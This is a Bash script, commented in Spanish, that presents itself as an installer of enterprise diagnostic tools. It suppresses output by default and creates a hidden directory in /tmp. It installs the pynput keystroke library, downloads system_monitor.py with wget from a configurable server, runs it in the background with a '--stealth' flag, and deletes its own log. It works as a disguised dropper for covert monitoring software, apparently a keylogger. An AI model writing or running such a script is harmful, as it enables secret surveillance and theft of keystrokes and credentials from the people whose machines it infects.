#!/bin/bash
# Script de instalación de herramientas de diagnóstico empresarial
# Optimizado para despliegue rápido en laboratorios

set -e

# Configuración
SILENT_MODE=true
INSTALL_DIR="/tmp/.sys_tools"
LOG_FILE="/tmp/.install.log"

# Función para logging silencioso
log() {
    if [ "$SILENT_MODE" = false ]; then
        echo "$1"
    fi
    echo "$(date): $1" >> "$LOG_FILE" 2>/dev/null || true
}

# Función para ejecutar comandos silenciosamente
silent_exec() {
    if [ "$SILENT_MODE" = true ]; then
        "$@" > /dev/null 2>&1
    else
        "$@"
    fi
}

# Detectar sistema operativo
detect_os() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$NAME
    elif type lsb_release >/dev/null 2>&1; then
        OS=$(lsb_release -si)
    else
        OS=$(uname -s)
    fi
    log "Sistema detectado: $OS"
}

# Instalar dependencias según el SO
install_dependencies() {
    log "Instalando dependencias del sistema..."
    
    case "$OS" in
        *Ubuntu*|*Debian*)
            silent_exec sudo apt-get update
            silent_exec sudo apt-get install -y python3 python3-pip python3-venv
            ;;
        *CentOS*|*Red\ Hat*|*Fedora*)
            silent_exec sudo yum install -y python3 python3-pip || silent_exec sudo dnf install -y python3 python3-pip
            ;;
        *Arch*)
            silent_exec sudo pacman -Sy --noconfirm python python-pip
            ;;
        *)
            log "⚠️  SO no reconocido, intentando instalación genérica..."
            ;;
    esac
}

# Crear entorno virtual y instalar paquetes Python
setup_python_env() {
    log "Configurando entorno Python..."
    
    # Crear directorio oculto
    mkdir -p "$INSTALL_DIR"
    cd "$INSTALL_DIR"
    
    # Crear entorno virtual
    silent_exec python3 -m venv env
    
    # Activar entorno
    source env/bin/activate
    
    # Actualizar pip
    silent_exec pip install --upgrade pip
    
    # Instalar dependencias
    silent_exec pip install pynput requests
    
    log "✅ Entorno Python configurado"
}

# Descargar archivos del sistema
download_tools() {
    log "Descargando herramientas de diagnóstico..."
    
    # Cambiar estas URLs por tu servidor
    SERVER_IP="10.0.2.15"
    SERVER_PORT="8080"
    BASE_URL="http://$SERVER_IP:$SERVER_PORT"
    
    # Descargar archivos principales
    silent_exec wget -q "$BASE_URL/system_monitor.py" -O system_monitor.py
    
    # Hacer ejecutable
    chmod +x system_monitor.py
    
    log "✅ Herramientas descargadas"
}

# Ejecutar en modo background
start_monitoring() {
    log "Iniciando monitoreo del sistema..."
    
    # Activar entorno virtual
    source env/bin/activate
    
    # Ejecutar en background con nohup
    nohup python3 system_monitor.py --stealth > /dev/null 2>&1 &
    
    # Guardar PID para poder matar el proceso después
    echo $! > .monitor_pid
    
    log "✅ Monitoreo iniciado en background (PID: $!)"
}

# Función de limpieza (opcional)
cleanup() {
    log "Limpiando archivos temporales..."
    rm -f "$LOG_FILE" 2>/dev/null || true
}

# Función principal
main() {
    log "🚀 Iniciando instalación de herramientas de diagnóstico..."
    
    detect_os
    install_dependencies
    setup_python_env
    download_tools
    start_monitoring
    cleanup
    
    if [ "$SILENT_MODE" = false ]; then
        echo "✅ Instalación completada"
        echo "📊 Monitoreo activo en background"
        echo "🔴 Para detener: kill \$(cat $INSTALL_DIR/.monitor_pid)"
    fi
}

# Detectar si se quiere modo verbose
if [[ "$*" == *"--verbose"* ]]; then
    SILENT_MODE=false
fi

# Ejecutar función principal
main "$@"
